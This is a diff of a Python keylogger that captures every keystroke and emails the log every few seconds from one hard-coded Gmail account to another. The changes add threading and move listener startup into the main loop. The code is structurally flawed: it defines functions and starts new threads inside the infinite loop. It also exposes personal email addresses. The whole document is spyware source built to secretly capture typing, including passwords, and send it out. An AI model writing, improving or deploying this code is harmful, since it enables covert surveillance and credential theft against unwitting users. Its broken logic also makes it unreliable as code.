@@ -6,6 +6,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import threading
 
 def keyPressed(key):
     print(str(key))
@@ -16,11 +17,6 @@ def keyPressed(key):
         except:
             print("Error getting char")
 
-
-if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keyPressed)
-    listener.start()
-    input()
 
 fromaddr = "muneawr@gmail.com"
 toaddr = "munawarp.pa@gmail.com"
@@ -46,10 +42,23 @@ def mail():
     text = msg.as_string()
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
+    print("mailing done")
 
-schedule.every(1).seconds.do(mail)
-
-
+schedule.every(10).seconds.do(mail)
+     
 while True:
     schedule.run_pending()
-    time.sleep(5)
+    time.sleep(20)
+
+    def keylog():
+        listener = keyboard.Listener(on_press=keyPressed)
+        listener.start()
+
+    if __name__ == "__main__":
+        t1 = threading.Thread(target=keylog)
+        t2 = threading.Thread(target=mail)
+        t1.start()
+        t2.start()
+
+        t1.join()
+        t2.join()
